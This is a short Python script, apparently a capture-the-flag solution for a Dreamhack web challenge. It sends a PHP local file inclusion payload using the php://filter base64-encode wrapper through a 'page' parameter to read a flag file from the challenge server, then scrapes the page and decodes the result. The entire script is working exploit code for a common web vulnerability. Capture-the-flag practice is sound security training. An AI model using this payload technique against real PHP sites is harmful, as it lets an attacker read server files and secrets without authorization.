from bs4 import BeautifulSoup
import base64
import requests


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:18847"
    res = requests.get(url+'/', params={'page': 'php://filter/convert.base64-encode/resource=../uploads/flag'})
    tag = BeautifulSoup(res.content, 'html.parser').find_all("div", {'class': 'container'})[1]
    b64_flag = tag.text.strip()
    print(base64.b64decode(b64_flag).decode())
